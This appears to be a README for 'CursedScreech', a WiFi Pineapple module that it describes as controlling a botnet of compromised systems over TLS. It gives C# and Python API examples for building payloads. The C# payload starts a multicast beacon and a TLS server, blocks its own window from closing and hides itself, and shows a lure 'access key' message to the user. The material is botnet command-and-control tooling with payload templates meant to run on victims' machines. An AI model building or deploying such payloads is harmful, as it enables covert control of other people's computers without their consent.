# CursedScreech

A mass communicator module for the WiFi Pineapple that utilizes TLS to control a botnet of compromised systems.  Included is a C# API and Python API (with documentation) to write payloads that can communicate with CursedScreech and PortalAuth.


# APIs
I recommend using C# over Python to build your payload.  Both APIs are really simple to use but using C# will allow you to create a self-contained executable along with required keys/certificates.  Writing your payload in Python will require you to freeze your code and it can be difficult, if not impossible, to include all required files in a single executable.  If you can't make a single executable you will have to find a way to move the whole dist directory to the target machine.

### C# API Example
```
using System;
using System.Drawing;
using System.Windows.Forms;
using PineappleModules;

namespace Payload
{
	public partial class Form1 : Form {
    
		PA_Authorization pauth = new PA_Authorization();
	
		public Form1() {
			InitializeComponent();
	
			CursedScreech cs = new CursedScreech();
			cs.startMulticaster("231.253.78.29", 19578);
			cs.setRemoteCertificateSerial("EF-BE-AD-DE");
			cs.setRemoteCertificateHash("1234567890ABCDEF");
			cs.startSecureServerThread("Payload.Payload.pfx", "#$My$ecuR3P4ssw*rd&");
		}
		private void Form1_FormClosing(object sender, FormClosingEventArgs e) {
			e.Cancel = true;
			this.Hide();
		}
		private void accessKeyButton_Click(object sender, EventArgs e) {
				
			// Request an access key from the Pineapple
			string key = pauth.getAccessKey();
	
			// Check if a key was returned
			string msg;
			if (key.Length > 0) {
				msg = "Your access key is unique to you so DO NOT give it away!\n\nAccess Key: " + key;
			}
			else {
				msg = "Failed to retrieve an access key from the server.  Please try again later.";
			}
			
			// Display message to the user
			MessageBox.Show(msg);
		}
	}
}

```


### Python API Example
```
from PineappleModules import CursedScreech

cs = CursedScreech("Network Client")
cs.startMulticaster("231.253.78.29", 19578)
cs.setRemoteCertificateSerial("ABCDEF1234567890")
cs.startSecureServerThread("payload.pem", "payload.cer", "cursedscreech.cer")
```
